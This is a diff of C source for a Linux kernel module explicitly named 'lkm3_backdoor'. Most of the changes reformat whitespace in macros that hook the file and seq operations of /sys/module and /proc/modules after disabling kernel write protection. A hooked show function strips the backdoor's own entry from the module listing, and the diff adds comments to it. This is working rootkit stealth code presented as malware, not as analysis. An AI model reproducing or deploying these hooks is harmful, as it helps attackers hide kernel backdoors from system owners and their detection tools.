@@ -19,43 +19,43 @@
 #define ROOT_PATH "/sys/module"
 #define SECRET_MOD "lkm3_backdoor"
 
-#define set_f_op(op,path,new,old)										\
-	do{																	\
-    	struct file_operations *f_op; 									\
-    	struct file *filp = filp_open(path,O_RDONLY,0); 				\
-    	if(IS_ERR(filp)){ 												\
-        	printk("LKM6:Failed open\n");								\
-        	old = NULL;													\
-    	}else{															\
-			printk("LKM6:Success open");								\
-			f_op = (struct file_operations *)filp->f_op;				\
-			old = f_op->op;												\
-			disable_write_protection();									\
-        	f_op->op = new;												\
-        	enable_write_protection();									\
-    	}																\
+#define set_f_op(op,path,new,old)						\
+	do{									\
+    	struct file_operations *f_op; 						\
+    	struct file *filp = filp_open(path,O_RDONLY,0); 			\
+    	if(IS_ERR(filp)){ 							\
+        	printk("LKM6:Failed open\n");					\
+        	old = NULL;							\
+    	}else{									\
+			printk("LKM6:Success open");				\
+			f_op = (struct file_operations *)filp->f_op;		\
+			old = f_op->op;						\
+			disable_write_protection();				\
+        	f_op->op = new;							\
+        	enable_write_protection();					\
+    	}									\
 	}while(0)
 
 // hide /proc/modules
 #define PROC_PATH "/proc/modules"  
-#define set_file_seq_op(opname,path,new,old)							\
-	do{																	\
-		struct file *filp;												\
-		struct seq_file *seq;											\
-		struct seq_operations *seq_op;									\
-		filp = filp_open(path,O_RDONLY,0);								\
-		if(IS_ERR(filp)){												\
-			printk("Failed open\n");									\
-			old=NULL;													\
-		}else{															\
-			printk("Success opening filp\n");							\
-			seq = (struct seq_file*)filp->private_data;					\
-			seq_op = (struct seq_operations *)seq->op;					\
-			old = seq_op->opname;										\
-			disable_write_protection();									\
-			seq_op->opname = new;										\
-			enable_write_protection();									\
-		}																\
+#define set_file_seq_op(opname,path,new,old)					\
+	do{									\
+		struct file *filp;						\
+		struct seq_file *seq;						\
+		struct seq_operations *seq_op;					\
+		filp = filp_open(path,O_RDONLY,0);				\
+		if(IS_ERR(filp)){						\
+			printk("Failed open\n");				\
+			old=NULL;						\
+		}else{								\
+			printk("Success opening filp\n");			\
+			seq = (struct seq_file*)filp->private_data;		\
+			seq_op = (struct seq_operations *)seq->op;		\
+			old = seq_op->opname;					\
+			disable_write_protection();				\
+			seq_op->opname = new;					\
+			enable_write_protection();				\
+		}								\
 	}while(0)
 
 int (*real_iterate)(struct file *filp,struct dir_context *ctx);
@@ -141,8 +141,10 @@ int fake_seq_show(struct seq_file *seq,void *v){
     int ret;
     size_t last_count,last_size;
 	last_count = seq->count;
+	// call real_seq_show
 	ret = real_seq_show(seq,v);
 	last_size = seq->count - last_count;
+	//filter module
 	if(strnstr(seq->buf+seq->count-last_size,SECRET_MOD,last_size)){
         printk("LKM6:Module %s hided in %s\n",SECRET_MOD,PROC_PATH);
 		seq->count -= last_size;
